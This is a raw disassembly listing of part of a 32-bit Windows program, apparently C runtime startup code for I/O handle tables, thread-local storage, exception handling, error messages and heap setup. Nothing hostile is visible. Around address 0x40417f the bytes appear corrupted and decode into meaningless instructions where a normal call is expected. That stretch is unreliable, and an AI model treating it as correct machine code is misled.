  403eed:	8b f0                	mov    %eax,%esi
  403eef:	59                   	pop    %ecx
  403ef0:	3b f3                	cmp    %ebx,%esi
  403ef2:	75 04                	jne    0x403ef8
  403ef4:	33 f6                	xor    %esi,%esi
  403ef6:	eb 0b                	jmp    0x403f03
  403ef8:	55                   	push   %ebp
  403ef9:	57                   	push   %edi
  403efa:	56                   	push   %esi
  403efb:	e8 60 0d 00 00       	call   0x404c60
  403f00:	83 c4 0c             	add    $0xc,%esp
  403f03:	57                   	push   %edi
  403f04:	ff 15 08 71 40 00    	call   *0x407108
  403f0a:	8b c6                	mov    %esi,%eax
  403f0c:	eb 02                	jmp    0x403f10
  403f0e:	33 c0                	xor    %eax,%eax
  403f10:	5f                   	pop    %edi
  403f11:	5e                   	pop    %esi
  403f12:	5d                   	pop    %ebp
  403f13:	5b                   	pop    %ebx
  403f14:	59                   	pop    %ecx
  403f15:	59                   	pop    %ecx
  403f16:	c3                   	ret
  403f17:	55                   	push   %ebp
  403f18:	8b ec                	mov    %esp,%ebp
  403f1a:	83 ec 48             	sub    $0x48,%esp
  403f1d:	53                   	push   %ebx
  403f1e:	56                   	push   %esi
  403f1f:	57                   	push   %edi
  403f20:	68 80 04 00 00       	push   $0x480
  403f25:	e8 26 0c 00 00       	call   0x404b50
  403f2a:	8b f0                	mov    %eax,%esi
  403f2c:	59                   	pop    %ecx
  403f2d:	85 f6                	test   %esi,%esi
  403f2f:	75 08                	jne    0x403f39
  403f31:	6a 1b                	push   $0x1b
  403f33:	e8 6e f8 ff ff       	call   0x4037a6
  403f38:	59                   	pop    %ecx
  403f39:	89 35 c0 9b 40 00    	mov    %esi,0x409bc0
  403f3f:	c7 05 c0 9c 40 00 20 	movl   $0x20,0x409cc0
  403f46:	00 00 00 
  403f49:	8d 86 80 04 00 00    	lea    0x480(%esi),%eax
  403f4f:	3b f0                	cmp    %eax,%esi
  403f51:	73 1e                	jae    0x403f71
  403f53:	80 66 04 00          	andb   $0x0,0x4(%esi)
  403f57:	83 0e ff             	orl    $0xffffffff,(%esi)
  403f5a:	83 66 08 00          	andl   $0x0,0x8(%esi)
  403f5e:	c6 46 05 0a          	movb   $0xa,0x5(%esi)
  403f62:	a1 c0 9b 40 00       	mov    0x409bc0,%eax
  403f67:	83 c6 24             	add    $0x24,%esi
  403f6a:	05 80 04 00 00       	add    $0x480,%eax
  403f6f:	eb de                	jmp    0x403f4f
  403f71:	8d 45 b8             	lea    -0x48(%ebp),%eax
  403f74:	50                   	push   %eax
  403f75:	ff 15 f0 70 40 00    	call   *0x4070f0
  403f7b:	66 83 7d ea 00       	cmpw   $0x0,-0x16(%ebp)
  403f80:	0f 84 d1 00 00 00    	je     0x404057
  403f86:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403f89:	85 c0                	test   %eax,%eax
  403f8b:	0f 84 c6 00 00 00    	je     0x404057
  403f91:	8b 38                	mov    (%eax),%edi
  403f93:	8d 58 04             	lea    0x4(%eax),%ebx
  403f96:	8d 04 3b             	lea    (%ebx,%edi,1),%eax
  403f99:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403f9c:	b8 00 08 00 00       	mov    $0x800,%eax
  403fa1:	3b f8                	cmp    %eax,%edi
  403fa3:	7c 02                	jl     0x403fa7
  403fa5:	8b f8                	mov    %eax,%edi
  403fa7:	39 3d c0 9c 40 00    	cmp    %edi,0x409cc0
  403fad:	7d 56                	jge    0x404005
  403faf:	be c4 9b 40 00       	mov    $0x409bc4,%esi
  403fb4:	68 80 04 00 00       	push   $0x480
  403fb9:	e8 92 0b 00 00       	call   0x404b50
  403fbe:	85 c0                	test   %eax,%eax
  403fc0:	59                   	pop    %ecx
  403fc1:	74 3c                	je     0x403fff
  403fc3:	83 05 c0 9c 40 00 20 	addl   $0x20,0x409cc0
  403fca:	89 06                	mov    %eax,(%esi)
  403fcc:	8d 88 80 04 00 00    	lea    0x480(%eax),%ecx
  403fd2:	3b c1                	cmp    %ecx,%eax
  403fd4:	73 1c                	jae    0x403ff2
  403fd6:	80 60 04 00          	andb   $0x0,0x4(%eax)
  403fda:	83 08 ff             	orl    $0xffffffff,(%eax)
  403fdd:	83 60 08 00          	andl   $0x0,0x8(%eax)
  403fe1:	c6 40 05 0a          	movb   $0xa,0x5(%eax)
  403fe5:	8b 0e                	mov    (%esi),%ecx
  403fe7:	83 c0 24             	add    $0x24,%eax
  403fea:	81 c1 80 04 00 00    	add    $0x480,%ecx
  403ff0:	eb e0                	jmp    0x403fd2
  403ff2:	83 c6 04             	add    $0x4,%esi
  403ff5:	39 3d c0 9c 40 00    	cmp    %edi,0x409cc0
  403ffb:	7c b7                	jl     0x403fb4
  403ffd:	eb 06                	jmp    0x404005
  403fff:	8b 3d c0 9c 40 00    	mov    0x409cc0,%edi
  404005:	33 f6                	xor    %esi,%esi
  404007:	85 ff                	test   %edi,%edi
  404009:	7e 4c                	jle    0x404057
  40400b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40400e:	8b 08                	mov    (%eax),%ecx
  404010:	83 f9 ff             	cmp    $0xffffffff,%ecx
  404013:	74 38                	je     0x40404d
  404015:	8a 03                	mov    (%ebx),%al
  404017:	a8 01                	test   $0x1,%al
  404019:	74 32                	je     0x40404d
  40401b:	a8 08                	test   $0x8,%al
  40401d:	75 0b                	jne    0x40402a
  40401f:	51                   	push   %ecx
  404020:	ff 15 20 71 40 00    	call   *0x407120
  404026:	85 c0                	test   %eax,%eax
  404028:	74 23                	je     0x40404d
  40402a:	8b ce                	mov    %esi,%ecx
  40402c:	8b c6                	mov    %esi,%eax
  40402e:	c1 f9 05             	sar    $0x5,%ecx
  404031:	83 e0 1f             	and    $0x1f,%eax
  404034:	8b 0c 8d c0 9b 40 00 	mov    0x409bc0(,%ecx,4),%ecx
  40403b:	8d 04 c0             	lea    (%eax,%eax,8),%eax
  40403e:	8d 04 81             	lea    (%ecx,%eax,4),%eax
  404041:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404044:	8b 09                	mov    (%ecx),%ecx
  404046:	89 08                	mov    %ecx,(%eax)
  404048:	8a 0b                	mov    (%ebx),%cl
  40404a:	88 48 04             	mov    %cl,0x4(%eax)
  40404d:	83 45 fc 04          	addl   $0x4,-0x4(%ebp)
  404051:	46                   	inc    %esi
  404052:	43                   	inc    %ebx
  404053:	3b f7                	cmp    %edi,%esi
  404055:	7c b4                	jl     0x40400b
  404057:	33 db                	xor    %ebx,%ebx
  404059:	8b 0d c0 9b 40 00    	mov    0x409bc0,%ecx
  40405f:	8d 04 db             	lea    (%ebx,%ebx,8),%eax
  404062:	83 3c 81 ff          	cmpl   $0xffffffff,(%ecx,%eax,4)
  404066:	8d 34 81             	lea    (%ecx,%eax,4),%esi
  404069:	75 4d                	jne    0x4040b8
  40406b:	85 db                	test   %ebx,%ebx
  40406d:	c6 46 04 81          	movb   $0x81,0x4(%esi)
  404071:	75 05                	jne    0x404078
  404073:	6a f6                	push   $0xfffffff6
  404075:	58                   	pop    %eax
  404076:	eb 0a                	jmp    0x404082
  404078:	8b c3                	mov    %ebx,%eax
  40407a:	48                   	dec    %eax
  40407b:	f7 d8                	neg    %eax
  40407d:	1b c0                	sbb    %eax,%eax
  40407f:	83 c0 f5             	add    $0xfffffff5,%eax
  404082:	50                   	push   %eax
  404083:	ff 15 1c 71 40 00    	call   *0x40711c
  404089:	8b f8                	mov    %eax,%edi
  40408b:	83 ff ff             	cmp    $0xffffffff,%edi
  40408e:	74 17                	je     0x4040a7
  404090:	57                   	push   %edi
  404091:	ff 15 20 71 40 00    	call   *0x407120
  404097:	85 c0                	test   %eax,%eax
  404099:	74 0c                	je     0x4040a7
  40409b:	25 ff 00 00 00       	and    $0xff,%eax
  4040a0:	89 3e                	mov    %edi,(%esi)
  4040a2:	83 f8 02             	cmp    $0x2,%eax
  4040a5:	75 06                	jne    0x4040ad
  4040a7:	80 4e 04 40          	orb    $0x40,0x4(%esi)
  4040ab:	eb 0f                	jmp    0x4040bc
  4040ad:	83 f8 03             	cmp    $0x3,%eax
  4040b0:	75 0a                	jne    0x4040bc
  4040b2:	80 4e 04 08          	orb    $0x8,0x4(%esi)
  4040b6:	eb 04                	jmp    0x4040bc
  4040b8:	80 4e 04 80          	orb    $0x80,0x4(%esi)
  4040bc:	43                   	inc    %ebx
  4040bd:	83 fb 03             	cmp    $0x3,%ebx
  4040c0:	7c 97                	jl     0x404059
  4040c2:	ff 35 c0 9c 40 00    	push   0x409cc0
  4040c8:	ff 15 18 71 40 00    	call   *0x407118
  4040ce:	5f                   	pop    %edi
  4040cf:	5e                   	pop    %esi
  4040d0:	5b                   	pop    %ebx
  4040d1:	c9                   	leave
  4040d2:	c3                   	ret
  4040d3:	56                   	push   %esi
  4040d4:	e8 63 04 00 00       	call   0x40453c
  4040d9:	ff 15 e4 70 40 00    	call   *0x4070e4
  4040df:	83 f8 ff             	cmp    $0xffffffff,%eax
  4040e2:	a3 9c 87 40 00       	mov    %eax,0x40879c
  4040e7:	74 3a                	je     0x404123
  4040e9:	6a 74                	push   $0x74
  4040eb:	6a 01                	push   $0x1
  4040ed:	e8 a3 0e 00 00       	call   0x404f95
  4040f2:	8b f0                	mov    %eax,%esi
  4040f4:	59                   	pop    %ecx
  4040f5:	85 f6                	test   %esi,%esi
  4040f7:	59                   	pop    %ecx
  4040f8:	74 29                	je     0x404123
  4040fa:	56                   	push   %esi
  4040fb:	ff 35 9c 87 40 00    	push   0x40879c
  404101:	ff 15 e8 70 40 00    	call   *0x4070e8
  404107:	85 c0                	test   %eax,%eax
  404109:	74 18                	je     0x404123
  40410b:	56                   	push   %esi
  40410c:	e8 16 00 00 00       	call   0x404127
  404111:	59                   	pop    %ecx
  404112:	ff 15 ec 70 40 00    	call   *0x4070ec
  404118:	83 4e 04 ff          	orl    $0xffffffff,0x4(%esi)
  40411c:	6a 01                	push   $0x1
  40411e:	89 06                	mov    %eax,(%esi)
  404120:	58                   	pop    %eax
  404121:	5e                   	pop    %esi
  404122:	c3                   	ret
  404123:	33 c0                	xor    %eax,%eax
  404125:	5e                   	pop    %esi
  404126:	c3                   	ret
  404127:	8b 44 24 04          	mov    0x4(%esp),%eax
  40412b:	c7 40 50 f0 86 40 00 	movl   $0x4086f0,0x50(%eax)
  404132:	c7 40 14 01 00 00 00 	movl   $0x1,0x14(%eax)
  404139:	c3                   	ret
  40413a:	56                   	push   %esi
  40413b:	57                   	push   %edi
  40413c:	ff 15 88 70 40 00    	call   *0x407088
  404142:	ff 35 9c 87 40 00    	push   0x40879c
  404148:	8b f8                	mov    %eax,%edi
  40414a:	ff 15 dc 70 40 00    	call   *0x4070dc
  404150:	8b f0                	mov    %eax,%esi
  404152:	85 f6                	test   %esi,%esi
  404154:	75 3f                	jne    0x404195
  404156:	6a 74                	push   $0x74
  404158:	6a 01                	push   $0x1
  40415a:	e8 36 0e 00 00       	call   0x404f95
  40415f:	8b f0                	mov    %eax,%esi
  404161:	59                   	pop    %ecx
  404162:	85 f6                	test   %esi,%esi
  404164:	59                   	pop    %ecx
  404165:	74 26                	je     0x40418d
  404167:	56                   	push   %esi
  404168:	ff 35 9c 87 40 00    	push   0x40879c
  40416e:	ff 15 e8 70 40 00    	call   *0x4070e8
  404174:	85 c0                	test   %eax,%eax
  404176:	74 15                	je     0x40418d
  404178:	56                   	push   %esi
  404179:	e8 a9 ff ff ff       	call   0x404127
  40417e:	59                   	pop    %ecx
  40417f:	ff 0a                	decl   (%edx)
  404181:	f3 70 40             	repz jo 0x4041c4
  404184:	00 83 4e 04 ff 89    	add    %al,-0x7600fbb2(%ebx)
  40418a:	06                   	push   %es
  40418b:	eb 08                	jmp    0x404195
  40418d:	6a 10                	push   $0x10
  40418f:	e8 12 f6 ff ff       	call   0x4037a6
  404194:	59                   	pop    %ecx
  404195:	57                   	push   %edi
  404196:	ff 15 e0 70 40 00    	call   *0x4070e0
  40419c:	8b c6                	mov    %esi,%eax
  40419e:	5f                   	pop    %edi
  40419f:	5e                   	pop    %esi
  4041a0:	c3                   	ret
  4041a1:	33 c0                	xor    %eax,%eax
  4041a3:	6a 00                	push   $0x0
  4041a5:	39 44 24 08          	cmp    %eax,0x8(%esp)
  4041a9:	68 00 10 00 00       	push   $0x1000
  4041ae:	0f 94 c0             	sete   %al
  4041b1:	50                   	push   %eax
  4041b2:	ff 15 d8 70 40 00    	call   *0x4070d8
  4041b8:	85 c0                	test   %eax,%eax
  4041ba:	a3 a8 9b 40 00       	mov    %eax,0x409ba8
  4041bf:	74 15                	je     0x4041d6
  4041c1:	e8 5c 0e 00 00       	call   0x405022
  4041c6:	85 c0                	test   %eax,%eax
  4041c8:	75 0f                	jne    0x4041d9
  4041ca:	ff 35 a8 9b 40 00    	push   0x409ba8
  4041d0:	ff 15 24 71 40 00    	call   *0x407124
  4041d6:	33 c0                	xor    %eax,%eax
  4041d8:	c3                   	ret
  4041d9:	6a 01                	push   $0x1
  4041db:	58                   	pop    %eax
  4041dc:	c3                   	ret
  4041dd:	cc                   	int3
  4041de:	cc                   	int3
  4041df:	cc                   	int3
  4041e0:	55                   	push   %ebp
  4041e1:	8b ec                	mov    %esp,%ebp
  4041e3:	53                   	push   %ebx
  4041e4:	56                   	push   %esi
  4041e5:	57                   	push   %edi
  4041e6:	55                   	push   %ebp
  4041e7:	6a 00                	push   $0x0
  4041e9:	6a 00                	push   $0x0
  4041eb:	68 f8 41 40 00       	push   $0x4041f8
  4041f0:	ff 75 08             	push   0x8(%ebp)
  4041f3:	e8 98 1f 00 00       	call   0x406190
  4041f8:	5d                   	pop    %ebp
  4041f9:	5f                   	pop    %edi
  4041fa:	5e                   	pop    %esi
  4041fb:	5b                   	pop    %ebx
  4041fc:	8b e5                	mov    %ebp,%esp
  4041fe:	5d                   	pop    %ebp
  4041ff:	c3                   	ret
  404200:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404204:	f7 41 04 06 00 00 00 	testl  $0x6,0x4(%ecx)
  40420b:	b8 01 00 00 00       	mov    $0x1,%eax
  404210:	74 0f                	je     0x404221
  404212:	8b 44 24 08          	mov    0x8(%esp),%eax
  404216:	8b 54 24 10          	mov    0x10(%esp),%edx
  40421a:	89 02                	mov    %eax,(%edx)
  40421c:	b8 03 00 00 00       	mov    $0x3,%eax
  404221:	c3                   	ret
  404222:	53                   	push   %ebx
  404223:	56                   	push   %esi
  404224:	57                   	push   %edi
  404225:	8b 44 24 10          	mov    0x10(%esp),%eax
  404229:	50                   	push   %eax
  40422a:	6a fe                	push   $0xfffffffe
  40422c:	68 00 42 40 00       	push   $0x404200
  404231:	64 ff 35 00 00 00 00 	push   %fs:0x0
  404238:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40423f:	8b 44 24 20          	mov    0x20(%esp),%eax
  404243:	8b 58 08             	mov    0x8(%eax),%ebx
  404246:	8b 70 0c             	mov    0xc(%eax),%esi
  404249:	83 fe ff             	cmp    $0xffffffff,%esi
  40424c:	74 2e                	je     0x40427c
  40424e:	3b 74 24 24          	cmp    0x24(%esp),%esi
  404252:	74 28                	je     0x40427c
  404254:	8d 34 76             	lea    (%esi,%esi,2),%esi
  404257:	8b 0c b3             	mov    (%ebx,%esi,4),%ecx
  40425a:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  40425e:	89 48 0c             	mov    %ecx,0xc(%eax)
  404261:	83 7c b3 04 00       	cmpl   $0x0,0x4(%ebx,%esi,4)
  404266:	75 12                	jne    0x40427a
  404268:	68 01 01 00 00       	push   $0x101
  40426d:	8b 44 b3 08          	mov    0x8(%ebx,%esi,4),%eax
  404271:	e8 40 00 00 00       	call   0x4042b6
  404276:	ff 54 b3 08          	call   *0x8(%ebx,%esi,4)
  40427a:	eb c3                	jmp    0x40423f
  40427c:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  404283:	83 c4 0c             	add    $0xc,%esp
  404286:	5f                   	pop    %edi
  404287:	5e                   	pop    %esi
  404288:	5b                   	pop    %ebx
  404289:	c3                   	ret
  40428a:	33 c0                	xor    %eax,%eax
  40428c:	64 8b 0d 00 00 00 00 	mov    %fs:0x0,%ecx
  404293:	81 79 04 00 42 40 00 	cmpl   $0x404200,0x4(%ecx)
  40429a:	75 10                	jne    0x4042ac
  40429c:	8b 51 0c             	mov    0xc(%ecx),%edx
  40429f:	8b 52 0c             	mov    0xc(%edx),%edx
  4042a2:	39 51 08             	cmp    %edx,0x8(%ecx)
  4042a5:	75 05                	jne    0x4042ac
  4042a7:	b8 01 00 00 00       	mov    $0x1,%eax
  4042ac:	c3                   	ret
  4042ad:	53                   	push   %ebx
  4042ae:	51                   	push   %ecx
  4042af:	bb a4 87 40 00       	mov    $0x4087a4,%ebx
  4042b4:	eb 0a                	jmp    0x4042c0
  4042b6:	53                   	push   %ebx
  4042b7:	51                   	push   %ecx
  4042b8:	bb a4 87 40 00       	mov    $0x4087a4,%ebx
  4042bd:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4042c0:	89 4b 08             	mov    %ecx,0x8(%ebx)
  4042c3:	89 43 04             	mov    %eax,0x4(%ebx)
  4042c6:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  4042c9:	59                   	pop    %ecx
  4042ca:	5b                   	pop    %ebx
  4042cb:	c2 04 00             	ret    $0x4
  4042ce:	cc                   	int3
  4042cf:	cc                   	int3
  4042d0:	56                   	push   %esi
  4042d1:	43                   	inc    %ebx
  4042d2:	32 30                	xor    (%eax),%dh
  4042d4:	58                   	pop    %eax
  4042d5:	43                   	inc    %ebx
  4042d6:	30 30                	xor    %dh,(%eax)
  4042d8:	55                   	push   %ebp
  4042d9:	8b ec                	mov    %esp,%ebp
  4042db:	83 ec 08             	sub    $0x8,%esp
  4042de:	53                   	push   %ebx
  4042df:	56                   	push   %esi
  4042e0:	57                   	push   %edi
  4042e1:	55                   	push   %ebp
  4042e2:	fc                   	cld
  4042e3:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4042e6:	8b 45 08             	mov    0x8(%ebp),%eax
  4042e9:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4042f0:	0f 85 82 00 00 00    	jne    0x404378
  4042f6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4042f9:	8b 45 10             	mov    0x10(%ebp),%eax
  4042fc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4042ff:	8d 45 f8             	lea    -0x8(%ebp),%eax
  404302:	89 43 fc             	mov    %eax,-0x4(%ebx)
  404305:	8b 73 0c             	mov    0xc(%ebx),%esi
  404308:	8b 7b 08             	mov    0x8(%ebx),%edi
  40430b:	83 fe ff             	cmp    $0xffffffff,%esi
  40430e:	74 61                	je     0x404371
  404310:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  404313:	83 7c 8f 04 00       	cmpl   $0x0,0x4(%edi,%ecx,4)
  404318:	74 45                	je     0x40435f
  40431a:	56                   	push   %esi
  40431b:	55                   	push   %ebp
  40431c:	8d 6b 10             	lea    0x10(%ebx),%ebp
  40431f:	ff 54 8f 04          	call   *0x4(%edi,%ecx,4)
  404323:	5d                   	pop    %ebp
  404324:	5e                   	pop    %esi
  404325:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404328:	0b c0                	or     %eax,%eax
  40432a:	74 33                	je     0x40435f
  40432c:	78 3c                	js     0x40436a
  40432e:	8b 7b 08             	mov    0x8(%ebx),%edi
  404331:	53                   	push   %ebx
  404332:	e8 a9 fe ff ff       	call   0x4041e0
  404337:	83 c4 04             	add    $0x4,%esp
  40433a:	8d 6b 10             	lea    0x10(%ebx),%ebp
  40433d:	56                   	push   %esi
  40433e:	53                   	push   %ebx
  40433f:	e8 de fe ff ff       	call   0x404222
  404344:	83 c4 08             	add    $0x8,%esp
  404347:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  40434a:	6a 01                	push   $0x1
  40434c:	8b 44 8f 08          	mov    0x8(%edi,%ecx,4),%eax
  404350:	e8 61 ff ff ff       	call   0x4042b6
  404355:	8b 04 8f             	mov    (%edi,%ecx,4),%eax
  404358:	89 43 0c             	mov    %eax,0xc(%ebx)
  40435b:	ff 54 8f 08          	call   *0x8(%edi,%ecx,4)
  40435f:	8b 7b 08             	mov    0x8(%ebx),%edi
  404362:	8d 0c 76             	lea    (%esi,%esi,2),%ecx
  404365:	8b 34 8f             	mov    (%edi,%ecx,4),%esi
  404368:	eb a1                	jmp    0x40430b
  40436a:	b8 00 00 00 00       	mov    $0x0,%eax
  40436f:	eb 1c                	jmp    0x40438d
  404371:	b8 01 00 00 00       	mov    $0x1,%eax
  404376:	eb 15                	jmp    0x40438d
  404378:	55                   	push   %ebp
  404379:	8d 6b 10             	lea    0x10(%ebx),%ebp
  40437c:	6a ff                	push   $0xffffffff
  40437e:	53                   	push   %ebx
  40437f:	e8 9e fe ff ff       	call   0x404222
  404384:	83 c4 08             	add    $0x8,%esp
  404387:	5d                   	pop    %ebp
  404388:	b8 01 00 00 00       	mov    $0x1,%eax
  40438d:	5d                   	pop    %ebp
  40438e:	5f                   	pop    %edi
  40438f:	5e                   	pop    %esi
  404390:	5b                   	pop    %ebx
  404391:	8b e5                	mov    %ebp,%esp
  404393:	5d                   	pop    %ebp
  404394:	c3                   	ret
  404395:	55                   	push   %ebp
  404396:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  40439a:	8b 29                	mov    (%ecx),%ebp
  40439c:	8b 41 1c             	mov    0x1c(%ecx),%eax
  40439f:	50                   	push   %eax
  4043a0:	8b 41 18             	mov    0x18(%ecx),%eax
  4043a3:	50                   	push   %eax
  4043a4:	e8 79 fe ff ff       	call   0x404222
  4043a9:	83 c4 08             	add    $0x8,%esp
  4043ac:	5d                   	pop    %ebp
  4043ad:	c2 04 00             	ret    $0x4
  4043b0:	a1 64 97 40 00       	mov    0x409764,%eax
  4043b5:	83 f8 01             	cmp    $0x1,%eax
  4043b8:	74 0d                	je     0x4043c7
  4043ba:	85 c0                	test   %eax,%eax
  4043bc:	75 2a                	jne    0x4043e8
  4043be:	83 3d ec 86 40 00 01 	cmpl   $0x1,0x4086ec
  4043c5:	75 21                	jne    0x4043e8
  4043c7:	68 fc 00 00 00       	push   $0xfc
  4043cc:	e8 18 00 00 00       	call   0x4043e9
  4043d1:	a1 b4 98 40 00       	mov    0x4098b4,%eax
  4043d6:	59                   	pop    %ecx
  4043d7:	85 c0                	test   %eax,%eax
  4043d9:	74 02                	je     0x4043dd
  4043db:	ff d0                	call   *%eax
  4043dd:	68 ff 00 00 00       	push   $0xff
  4043e2:	e8 02 00 00 00       	call   0x4043e9
  4043e7:	59                   	pop    %ecx
  4043e8:	c3                   	ret
  4043e9:	55                   	push   %ebp
  4043ea:	8b ec                	mov    %esp,%ebp
  4043ec:	81 ec a4 01 00 00    	sub    $0x1a4,%esp
  4043f2:	8b 55 08             	mov    0x8(%ebp),%edx
  4043f5:	33 c9                	xor    %ecx,%ecx
  4043f7:	b8 b8 87 40 00       	mov    $0x4087b8,%eax
  4043fc:	3b 10                	cmp    (%eax),%edx
  4043fe:	74 0b                	je     0x40440b
  404400:	83 c0 08             	add    $0x8,%eax
  404403:	41                   	inc    %ecx
  404404:	3d 48 88 40 00       	cmp    $0x408848,%eax
  404409:	7c f1                	jl     0x4043fc
  40440b:	56                   	push   %esi
  40440c:	8b f1                	mov    %ecx,%esi
  40440e:	c1 e6 03             	shl    $0x3,%esi
  404411:	3b 96 b8 87 40 00    	cmp    0x4087b8(%esi),%edx
  404417:	0f 85 1c 01 00 00    	jne    0x404539
  40441d:	a1 64 97 40 00       	mov    0x409764,%eax
  404422:	83 f8 01             	cmp    $0x1,%eax
  404425:	0f 84 e8 00 00 00    	je     0x404513
  40442b:	85 c0                	test   %eax,%eax
  40442d:	75 0d                	jne    0x40443c
  40442f:	83 3d ec 86 40 00 01 	cmpl   $0x1,0x4086ec
  404436:	0f 84 d7 00 00 00    	je     0x404513
  40443c:	81 fa fc 00 00 00    	cmp    $0xfc,%edx
  404442:	0f 84 f1 00 00 00    	je     0x404539
  404448:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  40444e:	68 04 01 00 00       	push   $0x104
  404453:	50                   	push   %eax
  404454:	6a 00                	push   $0x0
  404456:	ff 15 60 70 40 00    	call   *0x407060
  40445c:	85 c0                	test   %eax,%eax
  40445e:	75 13                	jne    0x404473
  404460:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  404466:	68 80 74 40 00       	push   $0x407480
  40446b:	50                   	push   %eax
  40446c:	e8 ef 05 00 00       	call   0x404a60
  404471:	59                   	pop    %ecx
  404472:	59                   	pop    %ecx
  404473:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  404479:	57                   	push   %edi
  40447a:	50                   	push   %eax
  40447b:	8d bd 5c fe ff ff    	lea    -0x1a4(%ebp),%edi
  404481:	e8 5a 07 00 00       	call   0x404be0
  404486:	40                   	inc    %eax
  404487:	59                   	pop    %ecx
  404488:	83 f8 3c             	cmp    $0x3c,%eax
  40448b:	76 29                	jbe    0x4044b6
  40448d:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  404493:	50                   	push   %eax
  404494:	e8 47 07 00 00       	call   0x404be0
  404499:	8b f8                	mov    %eax,%edi
  40449b:	8d 85 5c fe ff ff    	lea    -0x1a4(%ebp),%eax
  4044a1:	83 e8 3b             	sub    $0x3b,%eax
  4044a4:	6a 03                	push   $0x3
  4044a6:	03 f8                	add    %eax,%edi
  4044a8:	68 7c 74 40 00       	push   $0x40747c
  4044ad:	57                   	push   %edi
  4044ae:	e8 4d 14 00 00       	call   0x405900
  4044b3:	83 c4 10             	add    $0x10,%esp
  4044b6:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4044bc:	68 60 74 40 00       	push   $0x407460
  4044c1:	50                   	push   %eax
  4044c2:	e8 99 05 00 00       	call   0x404a60
  4044c7:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4044cd:	57                   	push   %edi
  4044ce:	50                   	push   %eax
  4044cf:	e8 9c 05 00 00       	call   0x404a70
  4044d4:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4044da:	68 5c 74 40 00       	push   $0x40745c
  4044df:	50                   	push   %eax
  4044e0:	e8 8b 05 00 00       	call   0x404a70
  4044e5:	ff b6 bc 87 40 00    	push   0x4087bc(%esi)
  4044eb:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  4044f1:	50                   	push   %eax
  4044f2:	e8 79 05 00 00       	call   0x404a70
  4044f7:	68 10 20 01 00       	push   $0x12010
  4044fc:	8d 85 60 ff ff ff    	lea    -0xa0(%ebp),%eax
  404502:	68 34 74 40 00       	push   $0x407434
  404507:	50                   	push   %eax
  404508:	e8 5e 13 00 00       	call   0x40586b
  40450d:	83 c4 2c             	add    $0x2c,%esp
  404510:	5f                   	pop    %edi
  404511:	eb 26                	jmp    0x404539
  404513:	8d 45 08             	lea    0x8(%ebp),%eax
  404516:	8d b6 bc 87 40 00    	lea    0x4087bc(%esi),%esi
  40451c:	6a 00                	push   $0x0
  40451e:	50                   	push   %eax
  40451f:	ff 36                	push   (%esi)
  404521:	e8 ba 06 00 00       	call   0x404be0
  404526:	59                   	pop    %ecx
  404527:	50                   	push   %eax
  404528:	ff 36                	push   (%esi)
  40452a:	6a f4                	push   $0xfffffff4
  40452c:	ff 15 1c 71 40 00    	call   *0x40711c
  404532:	50                   	push   %eax
  404533:	ff 15 54 70 40 00    	call   *0x407054
  404539:	5e                   	pop    %esi
  40453a:	c9                   	leave
  40453b:	c3                   	ret
  40453c:	56                   	push   %esi
  40453d:	8b 35 cc 70 40 00    	mov    0x4070cc,%esi
  404543:	ff 35 8c 88 40 00    	push   0x40888c
  404549:	ff d6                	call   *%esi
  40454b:	ff 35 7c 88 40 00    	push   0x40887c
  404551:	ff d6                	call   *%esi
  404553:	ff 35 6c 88 40 00    	push   0x40886c
  404559:	ff d6                	call   *%esi
  40455b:	ff 35 4c 88 40 00    	push   0x40884c
  404561:	ff d6                	call   *%esi
  404563:	5e                   	pop    %esi
  404564:	c3                   	ret
  404565:	55                   	push   %ebp
  404566:	8b ec                	mov    %esp,%ebp
  404568:	8b 45 08             	mov    0x8(%ebp),%eax
  40456b:	56                   	push   %esi
  40456c:	83 3c 85 48 88 40 00 	cmpl   $0x0,0x408848(,%eax,4)
  404573:	00 
  404574:	8d 34 85 48 88 40 00 	lea    0x408848(,%eax,4),%esi
  40457b:	75 3e                	jne    0x4045bb
  40457d:	57                   	push   %edi
  40457e:	6a 18                	push   $0x18
  404580:	e8 cb 05 00 00       	call   0x404b50
  404585:	8b f8                	mov    %eax,%edi
  404587:	59                   	pop    %ecx
  404588:	85 ff                	test   %edi,%edi
  40458a:	75 08                	jne    0x404594
  40458c:	6a 11                	push   $0x11
  40458e:	e8 13 f2 ff ff       	call   0x4037a6
  404593:	59                   	pop    %ecx
  404594:	6a 11                	push   $0x11
  404596:	e8 ca ff ff ff       	call   0x404565
  40459b:	83 3e 00             	cmpl   $0x0,(%esi)
  40459e:	59                   	pop    %ecx
  40459f:	57                   	push   %edi
  4045a0:	75 0a                	jne    0x4045ac
  4045a2:	ff 15 cc 70 40 00    	call   *0x4070cc
  4045a8:	89 3e                	mov    %edi,(%esi)
  4045aa:	eb 06                	jmp    0x4045b2
  4045ac:	e8 60 04 00 00       	call   0x404a11
  4045b1:	59                   	pop    %ecx
  4045b2:	6a 11                	push   $0x11
  4045b4:	e8 0d 00 00 00       	call   0x4045c6
  4045b9:	59                   	pop    %ecx
  4045ba:	5f                   	pop    %edi
  4045bb:	ff 36                	push   (%esi)
  4045bd:	ff 15 c8 70 40 00    	call   *0x4070c8
